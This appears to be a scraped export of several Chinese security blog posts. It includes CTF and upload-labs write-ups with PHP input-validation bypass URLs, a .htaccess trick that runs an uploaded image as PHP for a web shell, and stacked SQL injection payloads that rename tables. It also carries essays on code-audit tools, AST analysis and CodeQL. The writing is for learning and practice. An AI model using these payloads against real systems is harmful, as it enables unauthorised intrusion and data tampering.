//要相等if(is_palindrome_number($req[&quot;number&quot;]))//回文判断\n\n好了好了，关键过滤点我们都知道了。\n首先我们需要输入一个参数number,这number不能是数字或者数字字符串，但是又得是整数，他是回文数，又不能是回文数。阿哲。\n\n很离谱，我们想想绕过吧\n首先最简单的is_number()函数的绕过可以利用空字符截断%00\nis_numeric函数对于空字符%00判断为非数值，绕过第一个条件。函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符%20和空字符%00。\n\n可以看到是可以绕过的\n还有回文\n这里附上p神文章https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html#phpfuzz\n这里p神教了我们三种方法\nintval系统限制简单来说就是intval把变量转换为整数但他有极限，32位下-2147483648到 2147483647。\n64下\n最大为9223372036854775807。也就是说，当我们输入92233720368547758070这种大于极限的数字，就是会返回\n9223372036854775807也就是他的极限。\n\n那结合之前的绕过我们的payload就有了，思路就是输入一个本身和回文都大于极限的数，他们就相等了\n总结一下\n$req[‘number’]!&#x3D;strval(intval($req[‘number’]))这里是我们做文章要绕过的点，用我们的payload需要让这个成立，所以必须用09223372036854775807，为什么自己去理解\nfunction is_palindrome_number($number) &#123;     $number = strval($number); //strval — 获取变量的字符串值    $i = 0;     $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125; \n\n这个函数一个字符一个字符比较，我们不去管\n最终payload\nhttp://localhost/php_bugs-master/02.php/?number=%0009223372036854775807\n\n\nhttp://localhost/php_bugs-master/02.php/?number=%001000000000000000.00000000000000010\n还有其他的一些东西可以看p神\n03 多重加密","categories":["代码审计"],"tags":["代码审计","PHP"]},{"title":"python爬虫","url":"/2023/08/14/python%E7%88%AC%E8%99%AB/","content":"什么是爬虫网络爬虫又称网络蜘蛛、网络蚂蚁、网络机器人等，可以自动化浏览网络中的信息，当然浏览信息的时候需要按照我们制定的规则进行，这些规则我们称之为网络爬虫算法。使用Python可以很方便地编写出爬虫程序，进行互联网信息的自动化检索。\n网络爬虫的组成控制节点、爬虫节点、资源库\n\n可以看到，网络爬虫中可以有多个控制节点，每个控制节点下可以有多个爬虫节点，控制节点之间可以互相通信，同时，控制节点和其下的各爬虫节点之间也可以进行互相通信，属于同一个控制节点下的各爬虫节点间，亦可以互相通信。\n控制节点，也叫作爬虫的中央控制器，主要负责根据URL地址分配线程，并调用爬虫节点进行具体的爬行。\n爬虫节点会按照相关的算法，对网页进行具体的爬行，主要包括下载网页以及对网页的文本进行处理，爬行后，会将对应的爬行结果存储到对应的资源库中。\n网络爬虫的类型通用网络爬虫、聚焦网络爬虫、增量式网络爬虫、深层网络爬虫\n通用网络爬虫首先我们为大家介绍通用网络爬虫（General Purpose Web Crawler）。通用网络爬虫又叫作全网爬虫，顾名思义，通用网络爬虫爬取的目标资源在全互联网中。\n通用网络爬虫所爬取的目标数据是巨大的，并且爬行的范围也是非常大的，正是由于其爬取的数据是海量数据，故而对于这类爬虫来说，其爬取的性能要求是非常高的。这种网络爬虫主要应用于大型搜索引擎中，有非常高的应用价值。\n通用网络爬虫主要由初始URL集合、URL队列、页面爬行模块、页面分析模块、页面数据库、链接过滤模块等构成。通用网络爬虫在爬行的时候会采取一定的爬行策略，主要有深度优先爬行策略和广度优先爬行策略。\n聚焦网络爬虫聚焦网络爬虫（Focused  Crawler）也叫主题网络爬虫，顾名思义，聚焦网络爬虫是按照预先定义好的主题有选择地进行网页爬取的一种爬虫，聚焦网络爬虫不像通用网络爬虫一样将目标资源定位在全互联网中，而是将爬取的目标网页定位在与主题相关的页面中，此时，可以大大节省爬虫爬取时所需的带宽资源和服务器资源。\n增量式网络爬虫增量式网络爬虫（Incremental Web Crawler），所谓增量式，对应着增量式更新。\n增量式更新指的是在更新的时候只更新改变的地方，而未改变的地方则不更新，所以增量式网络爬虫，在爬取网页的时候，只爬取内容发生变化的网页或者新产生的网页，对于未发生内容变化的网页，则不会爬取。\n增量式网络爬虫在一定程度上能够保证所爬取的页面，尽可能是新页面。\n深层网络爬虫深层网络爬虫（Deep Web Crawler），可以爬取互联网中的深层页面，在此我们首先需要了解深层页面的概念。\n在互联网中，网页按存在方式分类，可以分为表层页面和深层页面。所谓的表层页面，指的是不需要提交表单，使用静态的链接就能够到达的静态页面；而深层页面则隐藏在表单后面，不能通过静态链接直接获取，是需要提交一定的关键词之后才能够获取得到的页面。\n在互联网中，深层页面的数量往往比表层页面的数量要多很多，故而，我们需要想办法爬取深层页面。\n爬取深层页面，需要想办法自动填写好对应表单，所以，深层网络爬虫最重要的部分即为表单填写部分。\n深层网络爬虫主要由URL列表、LVS列表（LVS指的是标签&#x2F;数值集合，即填充表单的数据源）、爬行控制器、解析器、LVS控制器、表单分析器、表单处理器、响应分析器等部分构成。\n实操网页请求的过程分为两个环节：\nRequest （请求）：每一个展示在用户面前的网页都必须经过这一步，也就是向服务器发送访问请求。\nResponse（响应）：服务器在接收到用户的请求后，会验证请求的有效性，然后向用户（客户端）发送响应的内容，客户端接收服务器响应的内容，将内容展示出来，就是我们所熟悉的网页请求，如下图所示。\n\n\n","categories":["工作"],"tags":["work","python","爬虫"]},{"title":"upload_labs","url":"/2023/05/27/upload-labs/","content":"Pass-01前端检测，f12+f1禁用javascript\nPass-02无过滤后端MIME检测\n直接用bp修改MIME就行\n\n源码分析$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]                        if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;\n\n$_FILES[&#39;upload_file&#39;]表示上传的文件信息，而[&#39;type&#39;]则表示该上传文件的MIME类型。\n用于检测，MIME\n$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];\n\n这句话是将临时文件名保存\n$img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]    \n\n获得文件路径\n路径和临时文件名都存在的话，就可以上传成功\n分析完其实就是一个MIME检测，这里只是了解一下常规的php代码是怎么写的\n这里就是检测路径和文件名存在\nPass-03黑名单问题，没有过滤完全\n$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;\n\n有一个需要注意的点就是这里需要环境配置，服务器\nAddType text/html .php .phtml .php5 .php3\n\n这里得自己增加开启，说白了这里其实很好防护\nPass_04本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！\n\n就是一个完全体的后缀过滤\n利用.htaccess文件\n.htaccess基础知识*重点内容*.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。它里面有这样一段代码：AllowOverride None，如果我们把None改成All\n\n.htaccess——超文本入口\n笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。\n\n所以我们可以尝试使用 这个 超文本入口 来达到这个目的\n.htaccess 文件内容：\n&lt;FilesMatch “shell.jpg”&gt;                      &#x2F;&#x2F;如果匹配到名为 shell.jpg 的文件 就执行该文件       SetHandler  application&#x2F;x-httpd-php             &#x2F;&#x2F;把文件当成php的代码来解析       \n1\n2\n3\n\n现在我们将该文件上传\n然后使用 蚁剑 进行链接\n然后我们发现链接失败 发现是 phpstudy集成环境中 php 的问题\n因为在 小皮面板中 php 版本 是nts 意思是即非线程安全，不提供数据访问保护 不支持使用 .htaccess \n","categories":["upload_labs"],"tags":["文件上传"]},{"title":"代码审计漫谈","url":"/2023/05/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%AB%E8%B0%88/","content":"前言因为自己想做一个代码审计工具，自己之前是有做过一点点代码审计的。审计过熊海，bluecms等等简单的一些cms。但是对其中的很多深层次原理都不了解。甚至可以说一点点都不懂，毕竟从用一个工具到做一个工具就是有本质上的区别。\n于我而言，做一个工具肯定是有很大的提升的。对于这个工具的构想，其实目标很简单，是想做出一款可以有多语言的，简洁的，几乎没有误报和漏报的一款简洁的代码审计工具(注意是几乎)。当然这个是很困难的QAQ。\n然后在写了一版申报书之后，发现自己想的太多了。这样一个大的项目以我本科生的水平几乎就是不可能完成的。所以呀，饭还是得一口一口吃。\n\n根据老师的一些建议，现在想的是如何从一个小的点上有所突破，做一个小而精的工具。我想这是我可以做到的\n一些概念其实一个好用的工具，最简单的标准就是自动化。不要当每一个人都是技术大牛，就算是技术大牛，有简单的工具我相信也没有人会去用复杂的工具\n所以自动化一定是最基础的要求点\n那怎么做到自动化，要有两个词的概念理解\n1.漏报率没有发现的bug\n2.误报率发现了错误的bug\n自动化代码审计工具正常来说都是我们给他一段代码，他给我们审计结果。这个结果中，里面这两个点就是绕不过的点。其实我之前的想法，什么深度学习，什么语法规则等等巴拉巴拉的东西，都是想为这两个点去服务。\n我们从深层原理去看看，为什么会出现这两个问题，也就是市面上的软件为什么也一直解决不了这个问题\n我们简单的把代码审计工具分为两类一类是动态的代码审计工具，一类是静态的代码审计工具\n动态代码审计工具这种工具基于代码运行的过程中处理挖掘漏洞一般称为IAST（interactive Application Security Testing）\n里面一般包含两个技术点\n1.hook在软件开发中，Hook是指在程序运行时，通过修改函数调用表（或者函数指针）的方法，使得程序在执行特定函数时，会先执行Hook函数，从而可以监控、修改或者替换原有函数的行为。在安全领域，攻击者可以使用Hook技术，将恶意代码注入到受攻击程序的运行过程中，从而获取敏感信息或者控制程序行为。\n2.前端爬虫在前端爬虫中，爬虫程序会模拟浏览器行为，对目标网站进行访问，并收集需要的数据。恶意攻击者可以使用Hook技术，监控网页中的某些函数调用。\n这里附上一张流程图\n\n我们通过前端爬虫模仿浏览器访问，同时使用hook，修改程序的执行流，如果如果Hook函数被触发，并满足某种条件，那么我们认为该漏洞存在。\n这类扫描工具的优势在于，通过这类工具发现的漏洞误报率比较低，且不依赖代码，一般来说，只要策略足够完善，能够触发到相应恶意函数的操作都会相应的满足某种恶意操作。而且可以跟踪动态调用也是这种方法最主要的优势之一。\n但是也有缺点\n(1) 前端Fuzz爬虫可以保证对正常功能的覆盖率，却很难保证对代码功能的覆盖率。如果曾使用动态代码审计工具对大量的代码扫描，不难发现，这类工具针对漏洞的扫描结果并不会比纯黑盒的漏洞扫描工具有什么优势，其中最大的问题主要集中在功能的覆盖度上。\n一般来说一个项目的代码是会有冗余的。也有很多开发人员也没想到的东西。有太多的代码不会从功能处发现，这样的检测就会有很高漏报率。\n(2) 动态代码审计对底层以及hook策略依赖较强，这里有很多问题。比如我们如果想要依赖IAST来做代码审计工具，我们的核心点就是要设计很多很多的hook方案，但是如果hook的深度不够，我们也不能执行我们的恶意代码，不能判断这里有漏洞。（漏报）还有也不是触发了恶意函数就可以判断有漏洞，比如有一个echo可以执行，不能直接判断为xss。同时由于需要运行，环境，执行效率等等都是很大很大的问题，这样也只能审计单一语言。多语言几乎是海量的工作量，所以现在的代码审计工具基本已经很少完全使用IAST了\n静态代码审计工具静态代码审计主要是通过分析目标代码，通过纯静态的手段进行分析处理，并挖掘相应的漏洞&#x2F;Bug.\n其实就是简单的人工读代码变成了机器读代码\n最基础的东西，也是最早或者说是最容易想到的方法\n正则匹配\n\n虽然我们匹配到了这个简单的漏洞，但是很快发现，事情并没有那么简单。\n\n但是这样永远没有尽头，你说用正则过滤过滤输入还是有用的，但是我们要去匹配代码，不可能完全覆盖，你永远不知道一些牛鬼蛇神怎么写代码\n于是有两种思路\n1.高覆盖性这类工具最经典的就是Seay，通过简单的关键字来匹配经可能多的目标，之后使用者可以通过人工审计的方式进一步确认。\n\\beval\\b\\(\n\n2.高可用性这类工具最经典的是Rips免费版\n\\beval\\b\\(\\$_(GET|POST)\n\n用更多的正则来约束，用更多的规则来覆盖多种情况。这也是早期静态自动化代码审计工具普遍的实现方法。\n但问题显而易见，高覆盖性和高可用性是这种实现方法永远无法解决的硬伤，不但维护成本巨大，而且误报率和漏报率也是居高不下。所以被时代所淘汰也是历史的必然。\n但是现在seay和rips依旧是主流软件，有人可能会问为什么，因为要其他钱啊！（开玩笑）\n再牛逼一点点AST!!!\nAST（Abstract Syntax Tree，抽象语法树）是一种用于表示程序源代码语法结构的树状数据结构。在编译器、解释器等程序分析工具中，AST通常是从源代码中生成的一种中间表示形式，用于对程序进行分析、优化、转换等操作。\nAST通常由一系列节点组成，每个节点表示源代码中的一个语法结构，例如函数、变量声明、表达式、控制流语句等。节点之间通过父子关系组织成一棵树，每个节点包含了语法结构的信息，例如标识符、运算符、字面量等。\nAST可以被用于各种程序分析和转换任务中，例如语法检查、编译优化、代码重构、程序理解和分析等。在编译器中，AST通常是编译过程中的一个重要中间表示形式，被用于生成目标代码。在静态分析工具中，AST可以被用于检查和修复代码中的各种问题，例如潜在的安全漏洞、性能瓶颈、代码风格问题等。\nAST在许多编程语言的编译器和解释器中都得到了广泛的应用，以下是一些使用AST的编程语言：\n\nC&#x2F;C++：GCC、Clang等编译器使用AST作为中间表示形式，用于编译、优化和代码生成。\nJava：Java编译器使用AST作为中间表示形式，用于语法检查、编译优化和代码生成。\nPython：Python解释器和静态分析工具使用AST进行代码检查、代码重构和性能优化。\nJavaScript：JavaScript解释器和编译器使用AST进行代码分析、优化和转换。\nRuby：Ruby解释器和编译器使用AST进行代码分析、优化和转换。\nGo：Go编译器使用AST作为中间表示形式，用于编译、优化和代码生成。\n\n除此之外，许多其他编程语言的编译器和解释器也采用了AST作为中间表示形式，以便于对程序进行分析和优化。\n看完这个概念大家有没有什么想法？再直观一点\n以php为例\n\n没错，我们只需要在AST上做文章，有了统一的AST语法树，上面的问题迎刃而解\n现在如何对AST语法树做分析也就成了我们这个工具最大的问题\n在理解如何分析AST语法树之前，我们首先要明白information flow、source、sink三个概念，\n\nsource： 我们可以简单的称之为输入，也就是information flow的起点\nsink： 我们可以称之为输出，也就是information flow的终点\n\n而information flow，则是指数据在source到sink之间流动的过程。\n也就是信息流分析\n把这个概念放在PHP代码审计过程中，Source就是指用户可控的输入，比如$_GET、$_POST等，而Sink就是指我们要找到的敏感函数，比如echo、eval，如果某一个Source到Sink存在一个完整的流，那么我们就可以认为存在一个可控的漏洞，这也就是基于information flow的代码审计原理。\n举个例子：\n\n\n这么一段代码生成的AST是什么捏\n\n也很简单\n在上面的分析过程中，Sink就是eval函数，source就是$_GET，通过逆向分析Sink的来源，我们成功找到了一条流向Sink的information flow，也就成功发现了这个漏洞。\n\n在分析information flow中明确作用域是基础中的基础\n如果我们只关注左值和右值的回溯\n\n我们会得到这样的结果\n但是这里有个get函数\n\n这样才是正确的流程\n所以我们的分析过程中作用域很重要\n在这段代码中，从主语法树的作用域跟到Get函数的作用域，如何控制这个作用域的变动，就是基于AST语法树分析的一大难点，当我们在代码中不可避免的使用递归来控制作用域时，在多层递归中的统一标准也就成了分析的基础核心问题。\n可是！\n\n还是有问题\n\n这样一段代码\n我们怎么分析\n应该说机器怎么分析\n逆向分析可以解决这个代码\n\n看到这里的分析，我们新建了一个规则作用于一个作用域。越来越复杂了。\n可能到现在你觉得我讲的有点懵、\n就是我们需要发现危险函数，但是AST的作用域就是程序的作用域，我们一但跳出一个函数就要建立新的规则，也就是说，每来一个作用域，我们都要新建立规则\n很复杂了吧，但是可以解决\n但是来个简单的\n\n这几乎是一个没有漏洞的代码，因为被过滤了\n但是AST不行\n这是一个典型的全局过滤，人工审计可以很容易看出这里被过滤了。但是如果在自动化分析过程中，当回溯到Source为$_GET[&#39;a&#39;]时，已经满足了从Source到sink的information flow。已经被识别为漏洞。一个典型的误报就出现了。\n而基于AST的自动化代码审计工具也正是在与这样的问题做博弈，从PHP自动化代码审计中比较知名的Rips、Cobra\n都是在不同的方式方法上，优化information flow分析的结果，而最大的区别则是离不开的高可用性、高覆盖性两点核心\n对于基于AST的代码分析来说，最大的挑战在于没人能保证自己完美的处理所有的AST结构，再加上基于单向流的分析方式，无法应对100%的场景，这也正是这类工具面临的问题（或者说，这也就是为什么选择逆向的原因）。\n所以呀，逆向很重要\nemmmm看来到目前也没有很好的解决方法\n还有基于IR&#x2F;CFG的分析AST是一个中间树，还有别的吗，答案是肯定的\nAST是编译原理中IR&#x2F;CFG的更上层\n也就是说，分析AST更接近分析代码，换句话就是说基于AST的分析得到的流，更接近脑子里对代码执行里的流程，忽略了大多数的分支、跳转、循环这类影响执行过程顺序的条件，这也是基于AST的代码分析的普遍解决方案，当然，从结果论上很难辨别忽略带来的后果。所以基于IR&#x2F;CFG这类带有控制流的解决方案，是现在更主流的代码分析方案，但不是唯一。\n什么是IR&#x2F;CFGIR（Intermediate Representation，中间表示）是一种高级语言和机器语言之间的抽象表示形式，通常是一种低级别的、机器无关的表示形式。IR可以作为编译器的一个重要中间表示形式，用于在源代码和目标代码之间进行转换和优化。IR通常是一种树状结构，包含了程序的控制流、数据流和操作等信息。\nCFG（Control Flow Graph，控制流图）是一种用于表示程序控制流的图形表示形式。CFG通过将程序的各个基本块（basic block）抽象为节点，将基本块之间的控制流关系抽象为有向边，从而形成一个图形结构。CFG可以用于描述程序的控制流结构，帮助程序员理解程序的执行过程，并在编译器中用于代码优化和转换。\n一般来说，我们需要遍历IR来生成CFG，其中需要按照一定的规则.当然，也可以用AST来生成CFG，毕竟AST是比较高的层级。\n而基于CFG的代码分析思路优势在于，对于一份代码来说，你首先有了一份控制流图（或者说是执行顺序），然后才到漏洞挖掘这一步。比起基于AST的代码分析来说，你只需要专注于从Source到Sink的过程即可。\n挑战的核心仍然维持在如何控制流，维持作用域，处理程序逻辑的分支过程，确认Source与Sink。\n理所当然的是，既然存在基于AST的代码分析，又存在基于CFG的代码分析，自然也存在其他的种类。比如现在市场上主流的fortify，Checkmarx，Coverity包括最新的Rips都使用了自己构造的语言的某一个中间部分，比如fortify和Coverity就需要对源码编译的某一个中间语言进行分析。前段时间被阿里收购的源伞甚至实现了多种语言生成统一的IR，这样一来对于新语言的扫描支持难度就变得大大减少了。\n新东西QLAST,CFG等其实本质上还是对于数据流的分析\n而QL就是把这个流的每一个环节具象化，把每个节点的操作具像成状态的变化，并且储存到数据库中。这样一来，通过构造QL语言，我们就能找到满足条件的节点，并构造成流。下面我举一个简单的例子来说：\n&lt;?php$a = $_GET[&#x27;a&#x27;];$b = htmlspecialchars($a);echo $b;\n\n我们简单的把前面的流写成一个表达式\necho =&gt; $_GET.is_filterxss\n\n这里is_filterxss被认为是输入$_GET的一个标记，在分析这类漏洞的时候，我们就可以直接用QL表达\nselect * where &#123;    Source : $_GET,    Sink : echo,    is_filterxss : False,&#125;\n\n我们就可以找到这个漏洞（上面的代码仅为伪代码），从这样的一个例子我们不难发现，QL其实更接近一个概念，他鼓励将信息流具象化，这样我们就可以用更通用的方式去写规则筛选。\n也就是更加的简单和方便\n也正是建立在这个基础上，CodeQL诞生了，它更像是一个基础平台，让你不需要在操心底层逻辑，使用AST还是CFG又或是某种平台，你可以将自动化代码分析简化约束为我们需要用怎么样的规则来找到满足某个漏洞的特征。这个概念也正是现代代码分析主流的实现思路，也就是将需求转嫁到更上层。\n参考文献：https://paper.seebug.org/1339/#_1\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"关于codeql的一些思考和学习","url":"/2023/05/06/%E5%85%B3%E4%BA%8Ecodeql%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83%E5%92%8C%E5%AD%A6%E4%B9%A0/","content":"前言想做一个代码审计的工具，查了查网上的资料，发现前沿一点的是一个叫codeql的一个技术，是一种数据库的东西，而且好像还是开源的。于是想来学习一下\ncodeql工作流程\n(图片来源：https://blog.semmle.com/introduction-to-variant-analysis-part-2/)\ncodeql整体思路是把我们想要审计的代码转换为一个可查询的数据库，有点神奇了起来。\n\n通过 Extractor 模块对源代码工程进行关键信息分析提取，构成一个关系型数据库。\ncodeql是自己搞得关系型数据库\n转换成数据库，得思考他转换成什么？\n这里对于不同的类型的语言他有不同的处理方式\n编译型Extrator模块监控编译过程，收集源码相关信息，得到其中的:AST,语义信息，控制流数据流等等，同时复制一份源码文件\n解释型Extrator模块直接分析源码\n这里我注意到EXtrator模块很牛哈\n我chatgpt一手\nCodeQL 中的 Extractor 模块是用于将源代码转换为 CodeQL 数据库的工具。它的主要工作原理是将源代码解析为抽象语法树（AST），然后使用 CodeQL 中预定义的语言规范将 AST 转换为具有关系的数据库模型。Extractor 可以识别多种编程语言中的代码，包括 C，C++，Java，Python，Go 等等。\nExtractor 还支持自定义解析器和外部语言规范，以便支持其他编程语言或特定的代码风格。例如，如果你的代码使用了一些非标准的语言特性或自定义的库，你可以通过定义自己的解析器和语言规范来使 Extractor 能够解析你的代码。\n总之，Extractor 模块的工作原理是将源代码转换为 CodeQL 数据库，它是 CodeQL 分析过程的第一步，为后续的分析提供了一个可查询的数据模型。\n牛的\n做完分析所有的数据会导入到CodeQL database这个文件夹，其中包括了源代码文件、关系数据、语言相关的 database schema（schema 定义了数据之间的相互关系）。\ncodeql自定义了一套名为QL的查询语言并提供了相应的支持库和运行环境。最终将查询结果返回给用户，方便用户进一步的审计\n项目构成codeql-cli-binaries 工程是 CodeQL 的命令行工具，实现了 CodeQL 的大部分核心功能，包括 Extractor（不同目标语言对应着不同的 Extractor）、中间语言转换、AST 提取、控制流分析、数据流分析等，这个工程的核心模块都只提供 binary，并不开放源代码。\nql 工程是 QL 查询语言的实现，QL 是一种面向对象的高级语言，其支持库中封装了程序分析所需的所有对象及常用方法。\n另外还有两个不太重要工程：\nvscode-codeql:https://github.com/github/vscode-codeql\nvscode-codeql-starter：https://github.com/github/vscode-codeql-starter\nvscode-codeql 是 CodeQL 的 VS Code 插件，它主要是为了方便在 VS Code 做结果展示用的; vscode-codeql-starter 工程是配合 VS Code 使用的一个 Workspace，它主要是为了方便配置，用户也完全可以自己配置 Workspace。\n这里配上他人的总结\n\nCodeQL 的这些能力是它独有的吗？当然不是。白盒代码审计并不是新的领域，业界已经有非常多的工具。老牌商业软件如 Fortify SCA, Coverity，开源工具更多，各大互联网公司也都会建设自己的源代码安全审计平台，这里就不一一列举了。以 Fortify 为例， 其产品白皮书中就说明了它的五大主要分析引擎：数据流、语义、结构、控制流、配置流。各家也都在做，学术界研究的也不少。\nCodeQL 有什么优势？简单说就是免费、开源、Semmle 团队强大的研究能力。Semmle 孵化于牛津大学, 其投资者包括 Google, Microsoft, NASA 等，现在又加入了 Github，这样闪光的履历其实也是能力的背书。具体讲，CodeQL 的基础功能扎实，迭代迅速，又不断有研究员发高水平的文章，这些都是它的优势。\nCodeQL 能给白盒领域带来突破性的发展吗？这个不一定。从本文的漏洞实例分析中你也可以看出，白盒审计最重要的能力是对安全模型的认识和对分析目标的理解。傻瓜一键式的工具是不存在的，或者换种说法，简单问题现有工具就能解决了。所以核心还是人。\nCodeQL 对我们有什么价值？分两方面。对个人而言，意味者被赋能了更复杂的代码分析能力。越是困难的问题，基础工具的能力越是重要，这在各个领域都是相通的。比如在二进制软件分析领域，近年来在 Intel PT 技术等基础能力的加持下，就有了非常迅速的发展。对企业而言，目前互联网公司的白盒代码审计多是采用采购商业软件 + 自研工具的方式，那我认为 CodeQL 当然是一个很重要的技术选型目标。\nCodeQL 更适用于哪些场景？更适用于对复杂安全问题的建模。Fortify 之类的老牌商业软件更重要的是它的规则库，更适合做大规模、通用型问题的扫描。CodeQL 当然也可以这样用，但我认为它更适合的场景是做复杂安全问题的建模，在对审计目标有足够理解的基础之上做针对性的安全分析。\n\n于我而言，codeql的核心技术不开源没有源码还是我很难受的一个点，笔者现在也在思考是否做一个只能基于他的binary的工具，其实还是不愿意的。\n参考文章：https://lennysec.github.io/codql-and-cve-2019-3560/\n","categories":["代码审计"],"tags":["代码审计","codeql"]},{"title":"应用安全测试技术","url":"/2023/08/07/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF/","content":"应用安全测试技术ASTAST（Application Security  Test，应用安全测试）,这个就是概念，很好理解，目前来说我知道的AST技术有三类,SAST,DAST,IAST\nSASTstatic，就是纯纯的白盒审计，意味着不用运行\n优点容易做，检出率高，定位到代码行\n缺点准确性差，看不到执行流，慢\nDAST纯纯黑盒测试，不访问代码和细节，扫描器就是\n优点无需代码\n执行快\n误报低\n缺点检出率低\n无法定位到代码行\n使用门槛高\nIAST结合了DAST和SAST\n既可以看到源代码，又可以看到应用程序的执行流\n优点检出率高，误报率低，实时产生结果\n","categories":["工作"],"tags":["work"]},{"title":"强网杯--nss","url":"/2023/05/21/%E5%BC%BA%E7%BD%91%E6%9D%AF-nss/","content":"[强网杯 2019]随便注很经典的一道题，利用这题复习复习堆叠注入\n还是前期测试\n\n用单引号闭合是这样的，如果注释一下\n\n回显正常，所以可以判断是单引号\n然后一直正常判断\n1’ union select 1,2#\n\n返回了黑名单\n看看过滤我们选择使用堆叠注入，堆叠注入就是使用多条语句一起执行\n1&#x27;;show databases;#1&#x27;;show tables;#0&#x27;;show columns from `1919810931114514`;#0&#x27;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#0&#x27; or &#x27;1&#x27;=&#x27;1https://www.freebuf.com/articles/web/250705.html\n\n[广东强网杯 2021 团队组]love_Pokemon &lt;?phperror_reporting(0);highlight_file(__FILE__);$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;function DefenderBonus($Pokemon)&#123;    if(preg_match(&quot;/&#x27;| |_|\\\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\\\\\|p|h|u|v|\\\\+|\\\\^|\\`|\\~|\\||\\&quot;|\\&lt;|\\&gt;|\\=|&#123;|&#125;|\\!|\\&amp;|\\*|\\?|\\(|\\)/i&quot;,$Pokemon))&#123;        die(&#x27;catch broken Pokemon! mew-_-two&#x27;);    &#125;    else&#123;        return $Pokemon;    &#125;&#125;function ghostpokemon($Pokemon)&#123;    if(is_array($Pokemon))&#123;        foreach ($Pokemon as $key =&gt; $pks) &#123;            $Pokemon[$key] = DefenderBonus($pks);        &#125;    &#125;    else&#123;        $Pokemon = DefenderBonus($Pokemon);    &#125;&#125;switch($_POST[&#x27;myfavorite&#x27;] ?? &quot;&quot;)&#123;    case &#x27;picacu!&#x27;:        echo md5(&#x27;picacu!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);        break;    case &#x27;bulbasaur!&#x27;:        echo md5(&#x27;miaowa!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);        $level = $_POST[&quot;levelup&quot;] ?? &quot;&quot;;    if 